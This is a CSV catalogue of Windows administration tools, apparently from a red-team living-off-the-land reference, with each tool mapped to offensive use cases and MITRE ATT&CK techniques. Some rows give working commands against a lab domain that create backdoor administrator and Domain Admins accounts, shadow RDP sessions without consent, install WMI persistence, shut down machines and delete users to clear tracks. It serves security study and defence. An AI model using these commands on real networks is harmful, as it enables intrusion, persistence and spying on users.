"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"psloggedon.exe","See who's logged on","2023-07-01","Sysinternals","","[''psloggedon.exe -nobanner \\W10.ad.bitsadmin.com''-|-''psloggedon.exe \\W10.ad.bitsadmin.com'']","[''List both interactive sessions and sessions to shares''-|-''Show sessions'']","[''None''-|-''Reconnaissance on currently active users'']","[''Sessions''-|-''Sessions'']","[''None''-|-''None'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"pslist.exe","Process information lister","2023-07-01","[''Sysinternals''-|-''TODO'']","","pslist.exe -nobanner \\W10.ad.bitsadmin.com","List all processes","Reconnaissance on running processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"pskill.exe","Terminates processes on local or remote systems","2023-07-01","[''Sysinternals''-|-''TODO'']","","pskill.exe","TODO","None","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"psinfo.exe","Local and remote system information viewer","2023-07-01","Sysinternals","","psinfo.exe \\W10.ad.bitsadmin.com","Show basic information","Reconnaissance on system information","Recon","Similar to [systeminfo.exe](../systeminfo)","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"psgetsid.exe","Translates SIDs to names and vice versa","2023-07-01","Sysinternals","","[''psgetsid.exe \\W10.ad.bitsadmin.com''-|-''psgetsid.exe \\W10.ad.bitsadmin.com Administrator'']","[''Resolve computer SID''-|-''Resolve SID of user'']","[''None''-|-''None'']","[''Recon''-|-''Recon'']","[''Installs service on remote system''-|-''Installs service on remote system'']","[''TA0043''-|-''TA0043'']","None","None","","Arris Huijgen","bitsadmin","","false"
"psfile.exe","Lists or closes files opened remotely","2023-07-01","[''Sysinternals''-|-''TODO'']","","psfile.exe -nobanner \\W10.ad.bitsadmin.com","List files opened remotely","None","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"psexec.exe","Executes a program on a remote system, where remotely executed console applications execute interactively","2023-07-01","Sysinternals","","psexec.exe \\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add","Execute commands","[''In this example adds a backdoor user''-|-''Can also be used to launch an implant'']","Execute","Installs PSEXESVC service on remote system","T1569.002","None","None","","Arris Huijgen","bitsadmin","","false"
"printui.exe","Automates many printer configuration tasks","2023-07-01","[''Builtin''-|-''GUI'']","","rundll32.exe printui.dll,PrintUIEntry /im /c\\W10.ad.bitsadmin.com","Add printer","None","Misc","Launches the ""Add Printer"" wizard","None","None","None","","Arris Huijgen","bitsadmin","","false"
"portqry.exe","Displays the state of TCP and UDP ports","2023-07-01","Extra","","portqry.exe -n DC1.ad.bitsadmin.com -e 135","Enumerate RPC endpoints","Reconnaissance of available RPC interfaces","Network","Download PortQry from the resource link","[''T1046''-|-''T1007'']","https://www.microsoft.com/en-us/download/details.aspx?id=17148","None","","Arris Huijgen","bitsadmin","","false"
"nslookup.exe","Displays information that you can use to diagnose Domain Name System (DNS) infrastructure","2023-07-01","Builtin","","nslookup.exe -q=srv _ldap._tcp.ad.bitsadmin.com","List LDAP servers","Identify DC IPs","Network","For more DNS domain-related DNS queries, see the link in the resources on DNS-Based Discovery","T1590.002","https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04","None","","Arris Huijgen","bitsadmin","","false"
"nltest.exe","Perform network administrative tasks","2023-07-01","RSAT","","[''nltest.exe /domain_trusts /all_trusts /v /server:DC1.ad.bitsadmin.com''-|-''nltest.exe /SHUTDOWN:"""" 0 /SERVER:W10.ad.bitsadmin.com'']","[''List domain trusts''-|-''Shutdown machine'']","[''Understand the setup of the Active Directory forest''-|-''Make machine unavailable'']","[''Domain''-|-''Sessions'']","[''None''-|-''None'']","[''None''-|-''T1529'']","None","None","","Arris Huijgen","bitsadmin","","false"
"nlb.exe","Manage Network Load Balancing (NLB)","2023-07-01","[''Server''-|-''TODO'']","","nlb.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"netsh.exe","Display or modify the network configuration","2023-08-25","Builtin","","[''netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name=""Remote Desktop - Shadow (TCP-In)""''-|-''netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name=""Remote Desktop - Shadow (TCP-In)"" new enable=yes'']","[''Show firewall rule''-|-''Enable firewall rule'']","[''Determine the configuration of a certain firewall rule and whether it is active''-|-''For example usage, see the Spying on users using RDP shadowing blog post (see resources)''-|-''Enable firewall rule''-|-''For example usage, see the Spying on users using RDP shadowing blog post (see resources)'']","[''Network''-|-''Network'']","[''None''-|-''None'']","[''T1562.004''-|-''T1562.004'']","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"netdom.exe","Manage Active Directory domains and trust relationships from the command prompt","2023-07-01","[''RSAT''-|-''Server'']","","[''netdom.exe join %computername% /domain:ad.bitsadmin.com''-|-''netdom.exe trust'']","[''Join machine to domain''-|-''Add a trust'']","[''None''-|-''None'']","[''Domain''-|-''Domain'']","[''Be aware that this will also push group policies and potentially security solutions''-|-''TODO: Complete command'']","[''None''-|-''T1484.002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"net.exe","Functionalities related to querying and modifying the domain, services, shares and users","2023-08-25","Builtin","","[''net.exe view \\W10.ad.bitsadmin.com /all''-|-''net.exe view \\W10.ad.bitsadmin.com''-|-''net.exe time \\W10.ad.bitsadmin.com''-|-''net.exe user backdoor Password1! /add /domain''-|-''net.exe user Administrator NewPassword1! /domain''-|-''net.exe group ""Domain Admins"" backdoor /add /domain'']","[''List all shares''-|-''List shares''-|-''Show time''-|-''Create new domain account''-|-''Update password''-|-''Add user to domain group'']","[''Identify all shares, including hidden ones to enumerate for sensitive information''-|-''Search for files on shares with credential material''-|-''Identify files that can be backdoored''-|-''None''-|-''Add backdoor account to the domain''-|-''Overwrite the password of a domain user''-|-''Add user to the ""Domain Admins"" group'']","[''Data''-|-''Data''-|-''Recon''-|-''Domain''-|-''Domain''-|-''Domain'']","[''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None'']","[''T1135''-|-''T1135''-|-''T1124''-|-''T1136.002''-|-''T1078.002''-|-''None''-|-''None'']","https://blog.bitsadmin.com/digging-for-secrets","None","","Arris Huijgen","bitsadmin","","false"
"ndkping.exe","RDMA Ping Cmd","2023-07-01","[''Builtin''-|-''TODO'']","","ndkping.exe","TODO","None","Network","Not sure what this is for","None","None","None","","Arris Huijgen","bitsadmin","","false"
"mstsc.exe","Connect to the desktop of remote computers","2024-12-13","[''Builtin''-|-''GUI'']","","[''mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt /control''-|-''mstsc.exe /remoteGuard /v:SP2019.ad.bitsadmin.com''-|-''mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt'']","[''Control a user's session''-|-''Remote Desktop''-|-''Shadow a user'']","[''Take over when a user is idle''-|-''Connect to a target server''-|-''Exfiltrate data over RDP clipboard or `\\tsclient` drives''-|-''If RDP provides access to a different network segment, SocksOverRDP can be used to pivot into that segment''-|-''Spy on a user's activity'']","[''Sessions''-|-''Sessions''-|-''Sessions'']","[''None''-|-''See also [RDCMan.exe](../RDCMan)''-|-''None'']","[''T1021.001''-|-''T1021.001''-|-''T1021.001'']","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"msra.exe","Windows Remote Assistance","2023-07-01","[''Builtin''-|-''TODO'']","","msra.exe","TODO","None","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"msinfo32.exe","Show system information","2023-07-01","[''Builtin''-|-''GUI'']","","msinfo32.exe","System Information","Show system information","Recon","View -> Remote Computer (Ctrl + R)","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"msg.exe","Send a message to a user","2023-07-01","[''Builtin''-|-''TODO'']","","msg.exe","TODO","None","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"mofcomp.exe","Parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository","2023-07-01","[''Builtin''-|-''TODO'']","","mofcomp.exe -N:\\W10.ad.bitsadmin.com\root\subscription .\backdoor.mof","Create persistence","None","Execute","None","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"manage-bde.exe","BitLocker Drive Encryption Configuration Tool","2023-07-01","[''Builtin''-|-''TODO'']","","manage-bde.exe -ComputerName W10.ad.bitsadmin.com","TODO","None","Data","None","T1486","None","None","","Arris Huijgen","bitsadmin","","false"
"logoff.exe","Terminates a session","2023-07-01","Builtin","","logoff.exe rdp-tcp#0 /SERVER:W10.ad.bitsadmin.com","Logoff user","Force logoff of a user","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"logman.exe","Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from the command line","2023-07-01","Builtin","","logman.exe query providers -s W10.ad.bitsadmin.com","List ETW providers","Identify ETW providers of security solutions that are installed, e.g. Sysinternals Sysmon's `Microsoft-Windows-Sysmon provider`","Logs","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"local.exe","Displays members of local groups on remote servers or domains","2023-07-01","Extra","","[''local.exe Administrators \\W10.ad.bitsadmin.com''-|-''local.exe ""Domain Admins"" ad.bitsadmin.com'']","[''List members of the Administrators group''-|-''List members of the ""Domain Admins"" group'']","[''Reconnaissance''-|-''Reconnaissance'']","[''Manage''-|-''Manage'']","[''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"ldifde.exe","LDIF Directory Exchange","2023-07-01","[''RSAT''-|-''TODO'']","","ldifde.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"gpresult.exe","Displays the Resultant Set of Policy (RSoP) information for a remote user and computer","2023-07-01","Builtin","","gpresult.exe /S W10.ad.bitsadmin.com /SCOPE COMPUTER /X W10.xml","Save effective policies to XML","Understand group policies that are applicable","Recon","None","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"gpfixup.exe","Group Policy fix up utility","2023-07-01","[''RSAT''-|-''TODO'']","","gpfixup.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"getmac.exe","Returns the media access control (MAC) address and list of network protocols associated with each address for all network cards in each computer","2023-07-01","Builtin","","getmac.exe /V /S W10.ad.bitsadmin.com","List network adapters","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"finger.exe","Displays information about a user on a specified system running the Finger service","2023-07-01","[''Builtin''-|-''TODO'']","","finger.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"eventcreate.exe","Create a custom event in a specified event log","2023-07-01","Builtin","","eventcreate.exe /S W10.ad.bitsadmin.com /T Error /ID 100 /L Application /D ""Some description""","Write error to Application event log","None","Logs","No events can be written to the Security event log","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsrm.exe","Deletes objects from the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsrm.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsquery.exe","This tool's commands suite allow you to query the directory according to specified criteria. Each of the following dsquery commands finds objects of a specific object type, with the exception of dsquery *, which can query for any type of object","2023-07-01","[''RSAT''-|-''TODO'']","","dsquery.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmove.exe","Moves or renames an object within the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsmove.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmod.exe","Modifies existing objects in the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsmod.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmgmt.exe","Facilitates managing AD DS/LDS application partitions, management and control of the Flexible Single Master Operations (FSMO), and cleaning up of metadata left behind by abandoned AD DCs/LDS instances","2023-07-01","[''RSAT''-|-''TODO'']","","dsmgmt.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsget.exe","Display the selected properties of a specific object in the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsget.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsadd.exe","Add specific types of objects to the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsadd.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsacls.exe","Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object","2023-07-01","[''RSAT''-|-''TODO'']","","dsacls.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsac.exe","Active Directory Administrative Center","2023-07-01","[''GUI''-|-''RSAT'']","","dsac.exe","Active Directory Administrative Center","View user's BitLocker recovery passwords, reset user's passwords and modify security of objects and OUs","Domain","[''Manage -> Add Navigation Nodes -> Connect to other domains -> Connect to: `ad.bitsadmin.com`''-|-''Needs to be executed from a OffensiveDC with a dummy domain (e.g. a Windows Server machine with a local `hacker.local` domain) in a `runas /netonly` context'']","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''389/TCP''-|-''9389/TCP''-|-''445/TCP'']","false"
"driverquery.exe","Display a list of installed device drivers","2023-07-01","Builtin","","driverquery.exe /s W10.ad.bitsadmin.com","List drivers","Identify drivers of security solutions that are installed","Recon","None","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"dnscmd.exe","Command-line interface for managing DNS servers","2023-07-01","[''RSAT''-|-''TODO'']","","dnscmd.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"djoin.exe","Provision a computer account in the domain","2023-07-01","[''RSAT''-|-''TODO'']","","djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker","Provision new computer account","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsutil.exe","Manage DFS Namespaces, servers, and clients","2023-07-01","RSAT","","dfsutil.exe root \\ad.bitsadmin.com\Users","List DFS servers of namespace","None","Data","[''Obtains the information from the DC via port 445/TCP -> DCE/RPC -> Settings for Microsoft Distributed File System''-|-''Performs (many) resolves via DNS.'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsrdiag.exe","DFS Replication operational and diagnostics command line utility","2023-07-01","[''RSAT''-|-''TODO'']","","dfsrdiag.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsdiag.exe","Provides diagnostic information for DFS Namespaces","2023-07-01","[''RSAT''-|-''TODO'']","","dfsdiag.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfscmd.exe","Configures DFS folders and folder targets in a DFS namespace","2023-07-01","[''RSAT''-|-''TODO'']","","dfscmd.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"devcon.exe","Displays detailed information about devices","2023-07-01","Extra","","devcon.exe -m:\\W10.ad.bitsadmin.com find *","List drivers","Identify drivers of security solutions that are installed","Recon","Part of Tools component of Windows Driver Kit (WDK)","TA0043","https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk","None","","Arris Huijgen","bitsadmin","","false"
"dcdiag.exe","Directory Server Diagnosis","2023-07-01","[''RSAT''-|-''TODO'']","","dcdiag.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"cusrmgr.exe","Manage local user accounts","2023-07-01","Extra","","[''cusrmgr.exe -u TargetUser -P Password1! -m \\W10.ad.bitsadmin.com''-|-''cusrmgr.exe -u TargetUser -alg Administrators -m \\W10.ad.bitsadmin.com''-|-''cusrmgr.exe -u TargetUser -d -m \\W10.ad.bitsadmin.com'']","[''Update password''-|-''Add user to local Administrators group''-|-''Delete user'']","[''Backdoor account''-|-''Backdoor account''-|-''Clear tracks'']","[''Manage''-|-''Manage''-|-''Manage'']","[''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"csvde.exe","Imports and exports data from Active Directory Domain Services (AD DS) using files that store data in the comma-separated value (CSV) format","2023-07-01","[''Builtin''-|-''TODO'']","","csvde.exe -m -f users.csv -s DC1.ad.bitsadmin.com -d ""cn=users,DC=ad,DC=bitsadmin,DC=com"" -r ""(objectClass=user)""","Query all users","Query LDAP over the commandline","Domain","Not sure if built-in","None","None","None","","Arris Huijgen","bitsadmin","","false"
"at.exe","Schedules commands and programs to run on a computer at a specified time and date","2023-11-04","Builtin","","[''at.exe \\W10.ad.bitsadmin.com 06:00 cmd /c ""net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add""''-|-''at.exe \\W10.ad.bitsadmin.com'']","[''Execute task''-|-''List tasks'']","[''Create backdoor user or launch implant''-|-''List current tasks to identify a name that can be used for a new task to blend in'']","[''Execute''-|-''Recon'']","[''Deprecated in favor of [schtasks.exe](../schtasks)''-|-''None'']","[''T1053.002''-|-''T1053.002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"adrestore.exe","Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one","2023-07-01","[''Sysinternals''-|-''TODO'']","","adrestore.exe","TODO","None","Domain","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"adexplorer.exe","Advanced Active Directory (AD) viewer and editor","2023-08-25","[''GUI''-|-''Sysinternals'']","","[''adexplorer.exe''-|-''adexplorer.exe -snapshot ad.bitsadmin.com:636 ad.bitsadmin.com.dat'']","[''Interactively browse LDAP''-|-''Obtain dump of Active Directory over TLS'']","[''Via File -> Connect, connect to a domain controller''-|-''If adexplorer is running in the context of a domain, the ""Connect to"" field can be left empty as it automatically connects to a DC of the current domain''-|-''When User and Password fields are left empty, Kerberos authentication is used''-|-''Offline evaluation of the AD to identify vulnerabilities and attack paths'']","[''Domain''-|-''Domain'']","[''None''-|-''Can be viewed offline using ADExplorer''-|-''Can also be imported to BloodHound format using ADExplorerSnapshot.py or to Adalanche (see references)'']","[''None''-|-''None'']","[''https://blog.bitsadmin.com/dealing-with-large-bloodhound-datasets''-|-''https://github.com/c3c/ADExplorerSnapshot.py''-|-''https://github.com/lkarlslund/Adalanche'']","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''636/TCP'']","false"
"WinAppDeployCmd.exe","Deploy a Universal Windows Platform (UWP) app to any Windows 10 device","2023-07-01","Extra","","WinAppDeployCmd.exe list -ip 10.0.10.51","Show the list of installed UWP apps","None","Manage","Part of the Windows 10 SDK","None","https://learn.microsoft.com/en-us/windows/uwp/packaging/install-universal-windows-apps-with-the-winappdeploycmd-tool","None","","Arris Huijgen","bitsadmin","","false"
"TpmVscMgr.exe","Create and delete TPM virtual smart cards","2023-07-01","[''Builtin''-|-''TODO'']","","TpmVscMgr.exe create /machine W11.ad.bitsadmin.com /name MyVSC /pin default /adminkey random /generate","Create virtual smart card","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Ssms.exe","SQL Server Management Studio (SSMS)","2023-11-04","[''Extra''-|-''GUI'']","","""C:\Program Files (x86)\Microsoft SQL Server Management Studio 19\Common7\IDE\Ssms.exe""","SQL Server Management Studio (SSMS)","Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links","Manage","[''Download link in resources''-|-''See also [SQLServerManager15.msc](../../MMC/SQLServerManager15)'']","None","https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms","None","","Arris Huijgen","bitsadmin","","false"
"SmeDesktop.exe","Windows Admin Center","2023-08-25","[''Extra''-|-''GUI'']","","""C:\Program Files\Windows Admin Center\SmeDesktop.exe""","Manage machines","Manage Certificates, Devices, Events, Files & file sharing, Firewall, Installed apps, Local users & groups, Networks, Performance Monitor, PowerShell, Processes, Registry, Remote Desktop, Roles & features, Scheduled tasks, Services, Storage, Storage Migration Service, Storage Replica, System Insights and Updates","Manage","[''Download and install Windows Admin Center and install it''-|-''Underlying extensively uses WinRM'']","None","https://www.microsoft.com/evalcenter/download-windows-admin-center","None","","Arris Huijgen","bitsadmin","","false"
"ServerManager.exe","Manage roles and features on servers in the domain","2023-07-01","[''GUI''-|-''RSAT'']","","ServerManager.exe","Server Manager","Manage roles and features on servers","Manage","Add other servers to manage -> DNS -> `DC1.ad.bitsadmin.com` -> Enter -> Arrow -> OK","None","None","","","Arris Huijgen","bitsadmin","[''5985/TCP''-|-''5986/TCP'']","false"
"RDCMan.exe","Remote Desktop Connection Manager","2024-12-13","[''GUI''-|-''Sysinternals'']","","RDCMan.exe","Remote Desktop","None","Sessions","[''Session -> Connect To (Ctrl + Q) -> Enter server name''-|-''See also [mstsc.exe](../mstsc)'']","T1021.001","None","None","","Arris Huijgen","bitsadmin","","false"
"Microsoft.ConfigurationManagement.exe","Microsoft Configuration Manager (MCM)","2023-11-04","[''Extra''-|-''GUI'']","","""C:\Program Files (x86)\Microsoft Endpoint Manager\AdminConsole\bin\Microsoft.ConfigurationManagement.exe""","Manage Microsoft Configuration Manager (MCM)","[''Collect information about systems''-|-''Deploy software implant to system'']","Manage","[''Download software, including Configuration Manager console on reference 1''-|-''Installation instructions on reference 2''-|-''At the Microsoft Configuration main screen, choose ""Install Configuration Manager console""''-|-''Add the `SMS:DebugView` parameter to the commandline to get an additional option (Tools) in the menu''-|-''Formerly known as System Center Configuration Manager (SCCM)'']","None","[''https://www.microsoft.com/en-us/evalcenter/download-microsoft-endpoint-configuration-manager''-|-''https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/install-consoles''-|-''https://http418infosec.com/offensive-sccm-summary'']","None","","Arris Huijgen","bitsadmin","","false"
"AccessEnum.exe","Displays who has access to items within a directory or registry key","2023-07-01","[''GUI''-|-''Sysinternals'']","","AccessEnum.exe","Enumerate share permissions","Identify writable files and folders on a share which can be backdoored","Data","Share first needs to be mounted to the local system as a drive; AccessEnum does not support scanning network shares","T1083","None","None","","Arris Huijgen","bitsadmin","","false"
